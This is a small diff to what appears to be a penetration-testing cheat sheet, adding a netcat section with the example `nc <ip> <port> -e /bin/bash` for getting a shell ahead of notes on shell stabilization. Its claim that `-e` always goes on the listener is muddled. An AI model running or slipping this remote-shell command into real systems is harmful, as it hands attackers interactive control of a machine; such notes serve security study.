@@ -1,3 +1,7 @@
+# NetCat shell
+`-e <cmd>` - specify a command to execute e.g. `nc <ip> <port> -e /bin/bash` for a shell \
+The `-e` flag must always be on the listener.
+ 
 # Shell stabilization
 We have caught or connected to a netcat shell
 ## Python
